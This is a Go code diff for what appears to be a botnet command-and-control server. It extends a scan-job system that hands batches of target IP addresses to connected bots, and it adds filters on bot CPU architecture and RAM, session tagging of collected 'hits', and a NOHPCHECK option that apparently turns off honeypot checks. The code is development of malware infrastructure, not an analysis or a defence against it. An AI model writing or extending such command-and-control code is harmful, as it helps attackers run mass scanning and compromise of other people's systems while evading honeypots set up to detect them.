@@ -53,6 +53,10 @@ type ScanJob struct {
 	Status    string            `json:"status"` // "running", "paused", "done"
 	BatchSize int               `json:"batchSize"`
 
+	// Bot filters — only assign work to bots matching these criteria
+	ArchFilter string `json:"archFilter,omitempty"`
+	MinRAM     int64  `json:"minRAM,omitempty"`
+
 	// Counters (computed from targets)
 	Total    int `json:"total"`
 	Pending  int `json:"pending"`
@@ -94,7 +98,7 @@ func init() {
 
 
 // CreateScanJob initializes a new scan job
-func CreateScanJob(jobType string, targets []string, config map[string]string, batchSize int) *ScanJob {
+func CreateScanJob(jobType string, targets []string, config map[string]string, batchSize int, archFilter string, minRAM int64) *ScanJob {
 	activeJobLock.Lock()
 	defer activeJobLock.Unlock()
 
@@ -103,15 +107,17 @@ func CreateScanJob(jobType string, targets []string, config map[string]string, b
 	}
 
 	job := &ScanJob{
-		ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
-		Type:      jobType,
-		Config:    config,
-		CreatedAt: time.Now(),
-		Status:    "running",
-		BatchSize: batchSize,
-		Total:     len(targets),
-		Pending:   len(targets),
-		cursor:    0,
+		ID:         fmt.Sprintf("%d", time.Now().UnixNano()),
+		Type:       jobType,
+		Config:     config,
+		CreatedAt:  time.Now(),
+		Status:     "running",
+		BatchSize:  batchSize,
+		ArchFilter: archFilter,
+		MinRAM:     minRAM,
+		Total:      len(targets),
+		Pending:    len(targets),
+		cursor:     0,
 	}
 
 	job.Targets = make([]ScanTarget, len(targets))
@@ -126,6 +132,10 @@ func CreateScanJob(jobType string, targets []string, config map[string]string, b
 	activeJob = job
 	botScanStats = make(map[string]*BotScanStat) // reset per-bot stats
 	saveScanJob()
+
+	// Tag hit store with this scan job's session ID
+	sessionID := fmt.Sprintf("%s_%s", jobType, job.ID)
+	hitStore.SetSession(jobType, sessionID)
 
 	// Broadcast job created
 	broadcastJobProgress("", "")
@@ -565,9 +575,16 @@ func ResumeJob() {
 // ClearJob removes the active job
 func ClearJob() {
 	activeJobLock.Lock()
-	defer activeJobLock.Unlock()
+	jtype := ""
+	if activeJob != nil {
+		jtype = activeJob.Type
+	}
 	activeJob = nil
 	os.Remove(jobsFile)
+	activeJobLock.Unlock()
+	if jtype != "" {
+		hitStore.ClearSession(jtype)
+	}
 }
 
 func saveScanJob() {
@@ -641,6 +658,25 @@ func assignNextBatch(botID string, botConn *BotConnection) {
 		return
 	}
 
+	// Apply job-level arch/RAM filters
+	activeJobLock.Lock()
+	var jobArch string
+	var jobMinRAM int64
+	if activeJob != nil {
+		jobArch = activeJob.ArchFilter
+		jobMinRAM = activeJob.MinRAM
+	}
+	activeJobLock.Unlock()
+
+	if jobArch != "" && botConn.arch != jobArch {
+		logMsg("[SCAN-JOB] Skipping %s — arch %s doesn't match filter %s", botID, botConn.arch, jobArch)
+		return
+	}
+	if jobMinRAM > 0 && botConn.ram < jobMinRAM {
+		logMsg("[SCAN-JOB] Skipping %s — RAM %dMB below minimum %dMB", botID, botConn.ram, jobMinRAM)
+		return
+	}
+
 	ramMB := botConn.ram
 
 	batch, config, jobType := PollTargets(botID, ramMB)
@@ -657,6 +693,9 @@ func assignNextBatch(botID string, botConn *BotConnection) {
 		payload = "MODE:" + config["mode"] + "\n"
 		if config["clean"] == "true" {
 			payload += "CLEAN:1\n"
+		}
+		if config["nohp"] == "true" {
+			payload += "NOHPCHECK:1\n"
 		}
 		for _, ip := range batch {
 			payload += ip + "\n"
